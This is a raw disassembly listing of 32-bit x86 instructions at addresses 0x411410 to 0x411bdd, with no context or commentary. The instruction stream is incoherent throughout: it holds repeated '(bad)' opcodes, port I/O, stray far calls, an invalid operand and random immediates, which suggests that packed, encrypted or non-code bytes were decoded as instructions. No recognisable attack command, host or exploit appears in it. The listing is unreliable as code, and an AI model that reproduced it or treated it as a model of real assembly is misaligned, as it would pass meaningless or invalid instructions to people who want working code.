  411410:	mov    ch,0x27
  411412:	push   0x11
  411414:	(bad)  
  411415:	in     eax,0x20
  411417:	out    dx,al
  411418:	js     0x411478
  41141a:	mov    eax,0xdf1a96b
  41141f:	mov    dh,ah
  411421:	loope  0x4113bc
  411423:	cmp    eax,0x8816d3ae
  411428:	xor    bl,BYTE PTR [esi]
  41142a:	inc    ebx
  41142b:	xchg   ebx,eax
  41142c:	push   es
  41142d:	sbb    bh,BYTE PTR [esi+0x13a10cf4]
  411433:	add    esp,esp
  411435:	and    cl,BYTE PTR [esi+eax*4-0x1d]
  411439:	and    eax,0xaa36f5ac
  41143e:	rcl    DWORD PTR [eax+eax*2-0x6833c410],cl
  411445:	popf   
  411446:	mov    edx,0x8a71fb00
  41144b:	rcr    BYTE PTR [edx],cl
  41144d:	mov    al,BYTE PTR [eax]
  41144f:	mov    ss,WORD PTR [ebx-0x60]
  411452:	or     esi,edi
  411454:	jp     0x411452
  411456:	mov    cl,0x37
  411458:	stc    
  411459:	mov    esi,0x99eaf924
  41145e:	cld    
  41145f:	fbld   TBYTE PTR [ebx+0x64d401ba]
  411465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411466:	inc    eax
  411467:	xor    dl,BYTE PTR [esi+ebx*8-0x43]
  41146b:	mov    ?,WORD PTR [si-0x1c]
  41146f:	and    al,0xba
  411471:	(bad)  
  411472:	mov    dl,0x6b
  411474:	icebp  
  411475:	mov    esp,0x7b27df08
  41147a:	add    dl,bl
  41147c:	fidivr DWORD PTR [eax]
  41147e:	icebp  
  41147f:	adc    BYTE PTR [ecx],cl
  411481:	or     bl,BYTE PTR [edi+0x5d28a24e]
  411487:	xchg   edx,eax
  411488:	add    dh,BYTE PTR ds:0x5917d7b8
  41148e:	add    eax,0xbfaeaacc
  411493:	jns    0x6dd74a78
  411499:	scas   al,BYTE PTR es:[edi]
  41149a:	and    al,0x1e
  41149c:	mov    BYTE PTR [edi],dl
  41149e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41149f:	repz test DWORD PTR [edx+0x2bd5d555],edx
  4114a6:	mov    eax,0xe7650656
  4114ab:	jno    0x4114cd
  4114ad:	adc    DWORD PTR [ebx+0x5a],0xefb3a0a0
  4114b4:	xchg   esi,eax
  4114b5:	mov    esi,0xf03647ad
  4114ba:	(bad)  
  4114bb:	out    dx,al
  4114bc:	leave  
  4114bd:	inc    edx
  4114be:	stos   DWORD PTR es:[edi],eax
  4114bf:	pushf  
  4114c0:	mov    ch,0x3b
  4114c2:	cmp    eax,DWORD PTR [esi+0x9]
  4114c5:	jp     0x4114bf
  4114c7:	jno    0x41149e
  4114c9:	call   0xff9c7680
  4114ce:	xchg   DWORD PTR [eax],ecx
  4114d0:	popf   
  4114d1:	jb     0x411530
  4114d3:	xor    al,0xeb
  4114d5:	aaa    
  4114d6:	cdq    
  4114d7:	mov    dl,0x61
  4114d9:	test   ch,bl
  4114db:	jle    0x4114b2
  4114dd:	or     eax,0xbdff574f
  4114e2:	fidivr WORD PTR [eax]
  4114e4:	dec    ecx
  4114e5:	stos   DWORD PTR es:[edi],eax
  4114e6:	mov    DWORD PTR [esi-0x28433bce],ebp
  4114ec:	clc    
  4114ed:	add    BYTE PTR ds:0x9867ae53,0x32
  4114f4:	pop    ds
  4114f5:	leave  
  4114f6:	push   edx
  4114f7:	inc    ebp
  4114f8:	cmp    dl,dh
  4114fa:	cmp    ch,ah
  4114fc:	cmp    edx,edi
  4114fe:	(bad)  
  411500:	popa   
  411501:	pop    ebx
  411502:	or     BYTE PTR [edi],bl
  411504:	push   cs
  411505:	or     BYTE PTR [ebp-0x47],bh
  411508:	int    0x6b
  41150a:	cmp    eax,0x986a84b6
  41150f:	sub    edi,DWORD PTR [eax+0x734bc711]
  411515:	xor    al,BYTE PTR ds:0xb5f64dac
  41151b:	or     BYTE PTR [edx-0x3bb214b0],0xd7
  411522:	scas   eax,DWORD PTR es:[edi]
  411523:	push   cs
  411524:	fidiv  DWORD PTR [edx+esi*2-0xe]
  411528:	jno    0x41157b
  41152a:	and    DWORD PTR [edi+0x91d2397],0x65
  411531:	(bad)  
  411532:	int3   
  411533:	pop    ebp
  411534:	scas   al,BYTE PTR es:[edi]
  411535:	out    dx,eax
  411536:	mov    ch,0xf7
  411538:	in     eax,dx
  411539:	and    DWORD PTR [ebx+0x6758b652],0x1
  411540:	add    eax,0x5672996a
  411545:	pop    ss
  411546:	test   eax,0xe5842d87
  41154b:	add    esp,DWORD PTR [ebx-0x57bf31db]
  411551:	js     0x411554
  411553:	repnz pop esp
  411555:	dec    ecx
  411556:	ja     0x411543
  411558:	outs   dx,DWORD PTR ds:[esi]
  411559:	sar    edi,0x62
  41155c:	imul   esp,ecx,0x4155e0b1
  411562:	retf   
  411563:	xor    eax,0x56d18859
  411568:	mov    eax,cs:0x7e435a6b
  41156e:	fadd   QWORD PTR [esi-0x6c]
  411571:	inc    edi
  411572:	stos   BYTE PTR es:[edi],al
  411573:	fstp   QWORD PTR [edi]
  411575:	icebp  
  411576:	xor    al,0x89
  411578:	adc    edi,ebx
  41157a:	or     eax,0xaba54912
  41157f:	and    esp,ebp
  411581:	push   ds
  411582:	aam    0xd4
  411584:	add    al,0x1d
  411586:	int    0x5a
  411588:	retf   0x398
  41158b:	out    dx,eax
  41158c:	dec    esp
  41158d:	inc    ecx
  41158e:	push   ss
  41158f:	ffree  st(7)
  411591:	jb     0x41158d
  411593:	push   0x3787a5bf
  411598:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411599:	sbb    ecx,eax
  41159b:	(bad)  
  41159c:	call   0x936ada30
  4115a1:	daa    
  4115a2:	lahf   
  4115a3:	outs   dx,BYTE PTR ds:[esi]
  4115a4:	aad    0x49
  4115a6:	retf   
  4115a7:	mov    dl,0x99
  4115a9:	imul   esi,esp,0xa075740d
  4115af:	in     eax,dx
  4115b0:	int3   
  4115b1:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4115b3:	sub    BYTE PTR [ecx],bl
  4115b5:	mov    edx,DWORD PTR [ebx+ebx*1]
  4115b8:	cmp    ch,dl
  4115ba:	add    al,0xf7
  4115bc:	xchg   esi,eax
  4115bd:	mov    eax,ds:0xc41ddf99
  4115c2:	fmulp  st(3),st
  4115c4:	in     eax,dx
  4115c5:	test   al,0x54
  4115c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115c8:	lods   al,BYTE PTR fs:[esi]
  4115ca:	call   0x2293:0x71b522a0
  4115d1:	loop   0x41162a
  4115d3:	shr    BYTE PTR [ecx+0x27],0x1
  4115d7:	ds (bad) 
  4115d9:	push   esi
  4115da:	xchg   ebx,eax
  4115db:	fmul   QWORD PTR [eax+0x39]
  4115de:	sbb    esi,edi
  4115e0:	iret   
  4115e1:	mov    dl,0x95
  4115e3:	jle    0x4115cb
  4115e5:	inc    ebx
  4115e6:	aas    
  4115e7:	cmp    esp,esi
  4115e9:	inc    eax
  4115ea:	mov    BYTE PTR [eax-0x6173d929],dh
  4115f0:	dec    ecx
  4115f1:	mov    ss,ebx
  4115f3:	cmp    BYTE PTR [ecx+ebx*4-0x421dee0f],bh
  4115fa:	hlt    
  4115fb:	sub    al,0x42
  4115fd:	cmp    ah,BYTE PTR [edx]
  4115ff:	cs mov eax,0xb16873f5
  411605:	adc    ch,BYTE PTR [edx+edi*4+0x18cf827]
  41160c:	and    dl,BYTE PTR [ebx-0x2d2fdfd4]
  411612:	inc    edx
  411613:	mov    bl,0xfa
  411615:	mov    ch,0x10
  411617:	retf   
  411618:	jnp    0x411645
  41161a:	pop    ebx
  41161b:	scas   al,BYTE PTR es:[edi]
  41161c:	repz cmc 
  41161e:	test   al,0x29
  411620:	es sahf 
  411622:	sub    esi,DWORD PTR [ecx+esi*4-0x27]
  411626:	rcr    eax,0xdb
  411629:	push   esp
  41162a:	call   0xe99f:0x97e86b92
  411631:	jp     0x41164f
  411633:	lds    ebx,FWORD PTR [edx+ecx*4+0x3a1d15a6]
  41163a:	xor    eax,0xf14ad1e0
  41163f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411640:	and    esp,DWORD PTR ds:0xc6bb54bf
  411646:	in     eax,dx
  411647:	imul   DWORD PTR [eax+0x496016b5]
  41164d:	cmp    al,0xca
  41164f:	cdq    
  411650:	sub    BYTE PTR [esi+eax*2],dl
  411653:	mov    bh,0xd1
  411655:	call   0xa89ab1d1
  41165a:	test   eax,0x37dcaf6f
  41165f:	daa    
  411660:	in     al,dx
  411661:	sub    ah,0xcd
  411664:	lods   eax,DWORD PTR ds:[esi]
  411665:	inc    esp
  411666:	push   edi
  411667:	enter  0x978a,0xb4
  41166b:	add    eax,DWORD PTR [edx]
  41166d:	xor    BYTE PTR [edi-0x707e2674],dl
  411673:	data16 sbb cl,BYTE PTR [ecx+0x30]
  411677:	mov    ch,0xac
  411679:	mov    al,0x32
  41167b:	mov    ds:0x7b3669a4,eax
  411680:	in     al,0xc2
  411682:	and    DWORD PTR [esi+0x19],ebp
  411685:	lds    eax,FWORD PTR [edi-0x5d]
  411688:	retf   
  411689:	outs   dx,DWORD PTR ds:[esi]
  41168a:	sbb    ecx,esi
  41168c:	push   edi
  41168d:	inc    edi
  41168e:	out    0x80,eax
  411690:	mov    esp,0xb2f14e91
  411695:	jae    0x4116ec
  411697:	xor    BYTE PTR [ecx-0x4a233c35],bl
  41169d:	(bad)  
  41169e:	sbb    dl,BYTE PTR ds:0x1ba0f39d
  4116a4:	xrelease xchg BYTE PTR [ebx-0x4f9ab202],ah
  4116ab:	ins    DWORD PTR es:[edi],dx
  4116ac:	stos   BYTE PTR es:[edi],al
  4116ad:	push   es
  4116ae:	jmp    0x411718
  4116b0:	mov    eax,0x51396ff
  4116b5:	(bad)  
  4116b6:	shr    ebx,cl
  4116b8:	xor    ch,BYTE PTR [eax]
  4116ba:	cmp    ah,BYTE PTR [edx-0x7afe006d]
  4116c0:	shl    DWORD PTR cs:[ecx],1
  4116c3:	add    eax,0xad470778
  4116c8:	std    
  4116c9:	sbb    BYTE PTR [ebx],dh
  4116cb:	fisubr DWORD PTR [eax+0x5eb21cb3]
  4116d1:	inc    esi
  4116d2:	xchg   ebp,eax
  4116d3:	sbb    esi,DWORD PTR ss:[edx+0x330cea90]
  4116da:	lods   al,BYTE PTR ds:[esi]
  4116db:	mov    ds:0xfbd27665,eax
  4116e0:	test   eax,0xcbc7bf24
  4116e5:	cld    
  4116e6:	inc    ebp
  4116e7:	ret    0x356e
  4116ea:	jmp    0x411732
  4116ec:	mov    BYTE PTR [edi-0x15],al
  4116ef:	leave  
  4116f0:	fdivr  QWORD PTR [eax+0x24]
  4116f3:	push   cs
  4116f4:	inc    esi
  4116f5:	jge    0x41175e
  4116f7:	outs   dx,BYTE PTR ds:[esi]
  4116f8:	sbb    ebx,0xffffffe5
  4116fb:	dec    eax
  4116fc:	fsub   QWORD PTR [eax+0xec757d3]
  411702:	nop
  411703:	mov    dh,0xd8
  411705:	mov    ebp,0xd472fff6
  41170b:	je     0x4116b0
  41170d:	push   cs
  41170e:	sub    ch,BYTE PTR [ebp-0x45322487]
  411714:	xchg   esi,eax
  411715:	push   cs
  411716:	jmp    0x411750
  411718:	sbb    al,0xb3
  41171a:	inc    esp
  41171b:	out    0xbb,al
  41171d:	xchg   ebp,eax
  41171e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41171f:	in     al,dx
  411720:	imul   ecx,DWORD PTR [ebp+0x30dd8f2f],0xe0556dd1
  41172a:	cli    
  41172b:	cmp    esi,edi
  41172d:	jg     0x4116ed
  41172f:	push   ebx
  411730:	inc    eax
  411731:	push   DWORD PTR ds:0x72d6a5f8
  411737:	outs   dx,BYTE PTR ds:[esi]
  411738:	iret   
  411739:	mov    cl,0x0
  41173b:	jge    0x41170f
  41173d:	push   edi
  41173e:	bound  edx,QWORD PTR [esi-0x10]
  411741:	pop    ss
  411742:	pop    DWORD PTR [esi-0x435737bc]
  411748:	inc    ecx
  411749:	push   ecx
  41174a:	into   
  41174b:	xchg   edi,eax
  41174c:	xchg   edi,eax
  41174d:	nop
  41174e:	push   ecx
  41174f:	out    0x7d,eax
  411751:	mov    ecx,0x1fbf721e
  411756:	pop    ecx
  411757:	sbb    BYTE PTR [edi+0xb],0xbf
  41175b:	pusha  
  41175c:	out    0x82,eax
  41175e:	push   ss
  41175f:	or     al,0x4f
  411761:	mov    al,ds:0x38e849d7
  411766:	es ror dl,0xbb
  41176a:	enter  0x5957,0x8d
  41176e:	mov    eax,ds:0x9f4fc26b
  411773:	shr    dl,0x3e
  411776:	jnp    0x41171a
  411778:	and    al,0xfa
  41177a:	out    dx,al
  41177b:	jmp    0x4117b1
  41177d:	stc    
  41177e:	sub    eax,0x453dd36b
  411783:	shl    BYTE PTR [esi+0x4203c81e],cl
  411789:	sub    al,0x49
  41178b:	mov    eax,0x4ce2001
  411790:	jecxz  0x41173b
  411792:	mov    ah,0x1d
  411794:	push   ss
  411795:	rcl    DWORD PTR [esi-0x496579d6],0x19
  41179c:	push   ds
  41179d:	dec    ebp
  41179e:	sbb    eax,0x58d046d1
  4117a3:	mov    eax,0x1a5b6b13
  4117a8:	sar    ah,0x33
  4117ab:	push   esi
  4117ac:	xlat   BYTE PTR ds:[ebx]
  4117ad:	jmp    0x411806
  4117af:	in     eax,0xc8
  4117b1:	sub    BYTE PTR [ecx],ch
  4117b3:	bound  edx,QWORD PTR [ebx+0x3b]
  4117b6:	shl    al,cl
  4117b8:	(bad)  
  4117b9:	pop    esi
  4117ba:	mov    edx,0x115efd3a
  4117bf:	inc    esi
  4117c0:	add    dh,BYTE PTR [edi-0x78102194]
  4117c6:	adc    BYTE PTR [edi],0x3b
  4117c9:	or     DWORD PTR [ebp-0x67a17f82],esp
  4117cf:	xchg   ebx,eax
  4117d0:	jge    0x4117d9
  4117d2:	inc    ecx
  4117d3:	sti    
  4117d4:	(bad)  
  4117d6:	bnd jbe 0x4117ed
  4117d9:	xlat   BYTE PTR ds:[ebx]
  4117da:	pop    ecx
  4117db:	mov    eax,0xbe4d065e
  4117e0:	xor    ebp,DWORD PTR [ebp+0xb5a8af8]
  4117e6:	and    bl,dh
  4117e8:	inc    ebp
  4117e9:	pop    esp
  4117ea:	rep outs dx,DWORD PTR ds:[esi]
  4117ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117ed:	enter  0x668a,0x55
  4117f1:	pop    edx
  4117f2:	inc    esi
  4117f3:	in     al,0x2
  4117f5:	adc    DWORD PTR [ebx],ebp
  4117f7:	call   DWORD PTR [ecx-0x3c]
  4117fa:	push   ebp
  4117fb:	mov    bh,0x88
  4117fd:	pop    ecx
  4117fe:	and    eax,0xe5cfb2c0
  411803:	sahf   
  411804:	inc    ebp
  411805:	cmp    bl,bh
  411807:	cmp    al,0x8f
  411809:	retf   
  41180a:	mov    DWORD PTR [ebx],ebp
  41180c:	xchg   BYTE PTR [edi],al
  41180e:	xchg   ebp,eax
  41180f:	dec    edx
  411810:	icebp  
  411811:	out    0x93,al
  411813:	dec    ecx
  411814:	mov    edi,0xfa8dc8b4
  411819:	lds    ebp,FWORD PTR [ebp+0x70347aa0]
  41181f:	pop    esp
  411820:	push   esi
  411821:	lods   eax,DWORD PTR ds:[esi]
  411822:	jl     0x4117e2
  411824:	popf   
  411825:	pop    ebx
  411826:	push   edi
  411827:	int    0xeb
  411829:	mov    ds:0x86d4adde,al
  41182e:	out    0x80,al
  411830:	pop    edi
  411831:	test   BYTE PTR [edx+ebp*4-0x65],dl
  411835:	cmp    DWORD PTR [edi],eax
  411837:	aaa    
  411838:	std    
  411839:	sti    
  41183a:	(bad)  
  41183c:	test   eax,0x17c2929f
  411841:	fild   WORD PTR ds:0x89658bc
  411848:	and    eax,0x3ebdab25
  41184d:	xchg   esi,eax
  41184e:	test   edx,esp
  411850:	hlt    
  411851:	cmp    DWORD PTR [ecx+0x48],edx
  411854:	mov    dl,0xc4
  411856:	pop    ebp
  411857:	push   esp
  411858:	xchg   ebx,eax
  411859:	xchg   esi,eax
  41185a:	loope  0x411840
  41185c:	mov    bl,0xa6
  41185e:	sbb    eax,0x2039cbc6
  411863:	icebp  
  411864:	inc    esp
  411865:	sti    
  411866:	mov    bh,0x18
  411868:	aam    0xc9
  41186a:	fwait
  41186b:	ror    BYTE PTR [edi+0x17],cl
  41186e:	xlat   BYTE PTR ds:[ebx]
  41186f:	ins    BYTE PTR es:[edi],dx
  411870:	mul    DWORD PTR ds:0xc68669a5
  411876:	and    eax,0x984637d
  41187b:	or     eax,esp
  41187d:	pop    edi
  41187e:	in     eax,dx
  41187f:	popa   
  411880:	or     eax,0xf9e6ea1e
  411885:	xchg   DWORD PTR [ebx],ebx
  411887:	or     al,0x4e
  411889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41188a:	aaa    
  41188b:	inc    bp
  41188d:	(bad)  
  41188e:	push   0x583417bf
  411893:	sub    ebx,DWORD PTR [ebx-0x1ac586db]
  411899:	retf   0xc2d4
  41189c:	xchg   BYTE PTR [ecx+0x1e],bl
  41189f:	xor    DWORD PTR ds:0x3bfd41f8,edi
  4118a5:	mov    edx,0xadcd6189
  4118aa:	cdq    
  4118ab:	push   esi
  4118ac:	mov    cl,0xf4
  4118ae:	cmp    eax,0x1794a239
  4118b3:	jl     0x411904
  4118b5:	loop   0x4118fc
  4118b7:	jl     0x41185d
  4118b9:	(bad)  
  4118ba:	int3   
  4118bb:	adc    al,0x3f
  4118bd:	push   es
  4118be:	xor    eax,0x2ab4717a
  4118c3:	push   ebx
  4118c4:	outs   dx,DWORD PTR ds:[esi]
  4118c5:	pusha  
  4118c6:	imul   esp,ebp,0xf7828ac3
  4118cc:	add    DWORD PTR ds:0x636cc9d8,0x53b817cd
  4118d6:	xor    cl,BYTE PTR [esi-0x122e2c0f]
  4118dc:	enter  0x3d1f,0x58
  4118e0:	jae    0x411923
  4118e2:	div    bl
  4118e4:	adc    al,0x66
  4118e6:	cmp    DWORD PTR [ecx-0x5f],edx
  4118e9:	cs ret 0x1bb4
  4118ed:	push   ebx
  4118ee:	(bad)  
  4118ef:	mov    ebx,0x99ae6567
  4118f4:	lea    edx,[esi+0x3b]
  4118f7:	jl     0x411926
  4118f9:	repnz add eax,DWORD PTR [edi-0x2f]
  4118fd:	iret   
  4118fe:	mov    esp,0x3ae0ab13
  411903:	sbb    BYTE PTR [eax+eiz*8+0x67c78d38],ch
  41190a:	push   cs
  41190b:	stc    
  41190c:	scas   eax,DWORD PTR es:[edi]
  41190d:	clc    
  41190e:	popf   
  41190f:	sub    DWORD PTR [ebp+0x6c06304e],eax
  411915:	pop    es
  411916:	and    ecx,ecx
  411918:	dec    DWORD PTR [ebp+ecx*1-0x72f6970f]
  41191f:	xor    al,0xb1
  411921:	inc    esp
  411922:	leave  
  411923:	jns    0x411947
  411925:	das    
  411926:	js     0x41198a
  411928:	iret   
  411929:	xchg   ecx,eax
  41192a:	adc    DWORD PTR [edx],esi
  41192c:	mov    ds:0x7d8e9b51,al
  411931:	inc    edx
  411932:	or     al,0xca
  411934:	aaa    
  411935:	pop    edi
  411936:	ret    0x2f8e
  411939:	into   
  41193a:	shl    bh,0xe6
  41193d:	ffreep st(6)
  41193f:	mov    WORD PTR [edi],fs
  411941:	cmp    eax,0x85575a77
  411946:	out    dx,al
  411947:	mov    eax,ds:0xc182426b
  41194c:	stos   BYTE PTR es:[edi],al
  41194d:	call   0xa6a5:0xabba395f
  411954:	ss mov esi,0xfcea5472
  41195a:	lods   al,BYTE PTR ds:[esi]
  41195b:	(bad)  
  41195c:	pop    ebx
  41195d:	outs   dx,BYTE PTR ds:[esi]
  41195e:	or     eax,DWORD PTR [ecx+0x2e]
  411961:	shl    DWORD PTR [edx],0x13
  411964:	jb     0x4118f2
  411966:	dec    esp
  411967:	shl    DWORD PTR [edi+0x176a1f05],cl
  41196d:	test   BYTE PTR [ecx+0x1922fa2f],dl
  411973:	push   ds
  411974:	mov    DWORD PTR [ebx],ebx
  411976:	fimul  DWORD PTR [ebx+0x7]
  411979:	addr16 dec esp
  41197b:	jo     0x4119cd
  41197d:	cli    
  41197e:	nop
  41197f:	jl     0x4119d5
  411981:	(bad)  
  411982:	mov    esi,0xf00e0bbc
  411987:	cmp    eax,0x9c66b485
  41198c:	(bad)  
  41198d:	pop    edi
  41198e:	mov    dh,0x2a
  411990:	in     al,dx
  411991:	fidiv  DWORD PTR [ecx+0x26f636e2]
  411997:	or     eax,0xa326c8a4
  41199c:	stc    
  41199d:	add    eax,0x290644c8
  4119a2:	cmp    dl,BYTE PTR [ecx+0x60]
  4119a5:	push   es
  4119a6:	out    dx,eax
  4119a7:	jb     0x411a1c
  4119a9:	call   0x485a780b
  4119ae:	pop    ebp
  4119af:	cs sti 
  4119b1:	arpl   WORD PTR [edx+0x3e],si
  4119b4:	push   0xf6f59444
  4119b9:	nop
  4119ba:	mov    bl,0xf2
  4119bc:	ins    DWORD PTR es:[edi],dx
  4119bd:	push   es
  4119be:	mov    edx,0xcd8c4a09
  4119c3:	jne    0x41196b
  4119c5:	retf   
  4119c6:	(bad)  
  4119c7:	pop    ss
  4119c8:	repnz int3 
  4119ca:	cmc    
  4119cb:	jae    0x411a24
  4119cd:	or     dl,BYTE PTR [edi-0x34646e7b]
  4119d3:	push   esi
  4119d4:	adc    ebp,DWORD PTR [ebx-0x6721015]
  4119da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119db:	fsub   st,st(1)
  4119dd:	dec    ebp
  4119de:	mov    ebp,DWORD PTR [ebp-0x659f70f2]
  4119e4:	mov    ebp,DWORD PTR [eax+eiz*2-0x9]
  4119e8:	hlt    
  4119e9:	not    DWORD PTR [esi-0x1c]
  4119ec:	sub    al,0xb5
  4119ee:	push   es
  4119ef:	mov    cl,0x17
  4119f1:	mov    ecx,0x27b5e767
  4119f6:	(bad)  
  4119f7:	cmp    BYTE PTR [esi-0xcffcaaf],bl
  4119fd:	ja     0x4119b2
  4119ff:	pop    es
  411a00:	out    0x28,al
  411a02:	pop    ebp
  411a03:	inc    ecx
  411a04:	adc    bl,BYTE PTR [edx]
  411a06:	mov    edi,0xed553057
  411a0b:	les    eax,FWORD PTR [ebx]
  411a0d:	add    BYTE PTR [edx],bl
  411a0f:	je     0x411a20
  411a11:	lods   al,BYTE PTR ds:[esi]
  411a12:	mov    ah,0x1
  411a14:	sbb    eax,0x6dbacc40
  411a19:	lea    eax,[eax-0x77134a6e]
  411a1f:	pop    edx
  411a20:	adc    eax,DWORD PTR [edx]
  411a22:	imul   esp,ecx,0xffffff82
  411a25:	inc    esi
  411a26:	test   al,0xf1
  411a28:	add    BYTE PTR [esi+0x58a90a21],dl
  411a2e:	dec    eax
  411a2f:	mov    ds,esi
  411a31:	pop    ss
  411a32:	jge    0x4119e3
  411a34:	xchg   esi,eax
  411a35:	fst    QWORD PTR [ebx-0x3f]
  411a38:	test   DWORD PTR [ebx+esi*2+0x799a2e9],eax
  411a3f:	jge    0x411a88
  411a41:	mov    al,ds:0x900f611e
  411a46:	ficom  WORD PTR [edi-0x6a711d92]
  411a4c:	push   ecx
  411a4d:	xchg   ecx,eax
  411a4e:	outs   dx,BYTE PTR ds:[esi]
  411a4f:	add    BYTE PTR [esp+eax*4+0x50a391bc],ch
  411a56:	push   cs
  411a57:	mov    al,ds:0x2c69c556
  411a5c:	(bad)  
  411a5d:	ins    DWORD PTR es:[edi],dx
  411a5e:	ja     0x411aa7
  411a60:	aas    
  411a61:	shr    BYTE PTR [ebp+0x6ce30847],cl
  411a67:	jns    0x411a5f
  411a69:	push   ds
  411a6a:	mov    eax,0xdc1baac0
  411a6f:	shr    DWORD PTR [esi],cl
  411a71:	adc    eax,0x9992ca81
  411a76:	test   al,0x20
  411a78:	and    al,0x28
  411a7a:	sahf   
  411a7b:	or     ecx,eax
  411a7d:	mov    al,0x85
  411a7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a80:	popa   
  411a81:	xchg   DWORD PTR [ebp+0x5f],edi
  411a84:	std    
  411a85:	mul    DWORD PTR [edi+0x37]
  411a88:	inc    ecx
  411a89:	jae    0x411ae6
  411a8b:	hlt    
  411a8c:	repz sbb al,0xe5
  411a8f:	bound  ebp,QWORD PTR [esi]
  411a91:	(bad)  
  411a92:	std    
  411a93:	jne    0x411a42
  411a95:	jne    0x411afa
  411a97:	out    0x2b,eax
  411a99:	div    DWORD PTR [ecx+0x73]
  411a9c:	add    DWORD PTR gs:[edi+ecx*2],ecx
  411aa0:	cmp    BYTE PTR [edi],0xd3
  411aa3:	pop    edx
  411aa4:	lods   al,BYTE PTR ds:[esi]
  411aa5:	xchg   edi,eax
  411aa6:	test   DWORD PTR [ecx-0x181a6f73],esp
  411aac:	mov    bh,BYTE PTR [ebx-0x35]
  411aaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ab0:	sub    BYTE PTR ds:0x292f19ee,ah
  411ab6:	scas   al,BYTE PTR es:[edi]
  411ab7:	sub    eax,0xc51f611a
  411abc:	(bad)  
  411abd:	cli    
  411abe:	fucom  st(0)
  411ac0:	jg     0x411aa2
  411ac2:	cmp    ch,BYTE PTR [edi+0x77]
  411ac5:	and    al,0xfd
  411ac7:	mov    esp,0x893e64d
  411acc:	fadd   DWORD PTR [edx+ecx*4]
  411acf:	jae    0x411b13
  411ad1:	clc    
  411ad2:	popa   
  411ad3:	cmc    
  411ad4:	repz lock icebp 
  411ad7:	xor    bl,al
  411ad9:	repz jne 0x411abb
  411adc:	pop    ebp
  411add:	ss sti 
  411adf:	sub    esp,DWORD PTR [edx+edi*8+0x300d55b1]
  411ae6:	(bad)  
  411ae7:	jmp    DWORD PTR [ebx-0x2eb6150e]
  411aed:	jecxz  0x411a7c
  411aef:	jmp    0xaf924a73
  411af4:	pusha  
  411af5:	mov    cl,0xbc
  411af7:	int    0x47
  411af9:	mov    BYTE PTR [edi],bl
  411afb:	mov    DWORD PTR [eax],eax
  411afd:	xchg   ebp,eax
  411afe:	push   esi
  411aff:	xchg   esp,eax
  411b00:	xor    bl,al
  411b02:	fistp  QWORD PTR [esi]
  411b04:	or     esi,DWORD PTR [ecx-0x44a89827]
  411b0a:	pushf  
  411b0b:	cwde   
  411b0c:	add    eax,DWORD PTR [eax]
  411b0e:	dec    esp
  411b0f:	push   es
  411b10:	gs inc ebx
  411b12:	fwait
  411b13:	dec    ecx
  411b14:	pusha  
  411b15:	push   edi
  411b16:	fild   QWORD PTR [esi+0x6]
  411b19:	in     eax,0x4c
  411b1b:	sub    cl,ah
  411b1d:	outs   dx,DWORD PTR ds:[esi]
  411b1e:	stos   BYTE PTR es:[edi],al
  411b1f:	or     bl,BYTE PTR ds:0xe3bd3a5a
  411b25:	mov    eax,0x41885350
  411b2a:	jbe    0x411b33
  411b2c:	fnsave [ecx]
  411b2e:	dec    ecx
  411b2f:	mul    ebx
  411b31:	mov    al,dh
  411b33:	in     al,dx
  411b34:	adc    esi,edx
  411b36:	fxch   st(5)
  411b38:	inc    ebx
  411b39:	push   ebx
  411b3a:	push   esi
  411b3b:	pusha  
  411b3c:	ja     0x411b89
  411b3e:	or     DWORD PTR [esi-0x27],0x7f
  411b42:	jnp    0x411ac4
  411b44:	xchg   esi,eax
  411b45:	jno    0x411b30
  411b47:	in     eax,0x80
  411b49:	push   0xffffffc0
  411b4b:	jge    0x411b75
  411b4d:	(bad)  
  411b4e:	xchg   edi,eax
  411b4f:	add    DWORD PTR [edi],ecx
  411b51:	daa    
  411b52:	mov    ch,0xd1
  411b54:	fild   DWORD PTR [ebx-0x5b]
  411b57:	mov    al,ds:0x583081b0
  411b5c:	dec    DWORD PTR [edx-0x1380ce45]
  411b62:	jge    0x411b68
  411b64:	pop    es
  411b65:	aam    0xec
  411b67:	xlat   BYTE PTR ds:[ebx]
  411b68:	loop   0x411b10
  411b6a:	push   0x6a
  411b6c:	adc    BYTE PTR [edx+0x5e66ce52],bl
  411b72:	scas   eax,DWORD PTR es:[edi]
  411b73:	lock add DWORD PTR [ebx],ebx
  411b76:	mov    ecx,0x44ce2820
  411b7b:	leave  
  411b7c:	xchg   edi,eax
  411b7d:	adc    DWORD PTR ds:0x945f39de,ecx
  411b83:	jge    0x411b2a
  411b85:	xlat   BYTE PTR ds:[ebx]
  411b86:	dec    edx
  411b87:	popf   
  411b88:	jae    0x411b6c
  411b8a:	xchg   ebp,eax
  411b8b:	add    ch,dh
  411b8d:	jo     0x411b4a
  411b8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b90:	mov    BYTE PTR [eax+eiz*1],cl
  411b93:	into   
  411b94:	fist   DWORD PTR [edx+0xa]
  411b97:	scas   al,BYTE PTR es:[edi]
  411b98:	repz jno 0x411bd9
  411b9b:	xor    al,0x40
  411b9d:	mov    ecx,0xa5d22d3a
  411ba2:	hlt    
  411ba3:	or     al,0x99
  411ba5:	imul   ebx,DWORD PTR [eax+0x7bb9d0b5],0xffffffe7
  411bac:	imul   eax,edx,0x8062247d
  411bb2:	inc    ebp
  411bb3:	jmp    0x411c27
  411bb5:	mov    al,0xc3
  411bb7:	mov    al,ds:0x26af686c
  411bbc:	adc    DWORD PTR [eax+0x31],esp
  411bbf:	xchg   esi,eax
  411bc0:	mov    ah,0xc2
  411bc2:	mov    dh,0xa8
  411bc4:	add    edi,DWORD PTR [edi+0x33]
  411bc7:	push   ebx
  411bc8:	jp     0x411b9c
  411bca:	mov    eax,0x79706bdd
  411bcf:	ss sbb al,0x1c
  411bd2:	xor    ebx,edi
  411bd4:	push   edx
  411bd5:	es aad 0xfb
  411bd8:	xor    eax,0x98511c18
  411bdd:	sbb    edi,0x1d
